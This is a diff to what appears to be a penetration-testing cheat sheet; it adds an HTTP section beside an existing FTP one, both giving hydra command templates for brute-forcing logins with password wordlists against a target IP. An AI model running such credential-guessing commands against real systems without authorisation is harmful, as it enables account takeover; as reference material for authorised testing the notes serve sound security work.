@@ -18,3 +18,8 @@ recommended to reduce the tasks: use -t 4
 To brute for an FTP service with a known username try the following command.
 
 `hydra -l (UID) -P /path/to/500-worst-passwords.txt (TARGET IP ADDRESS) ftp`
+
+## HTTP
+To brute for an HTTP form, try the following syntax with `hydra`:
+
+`hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"`
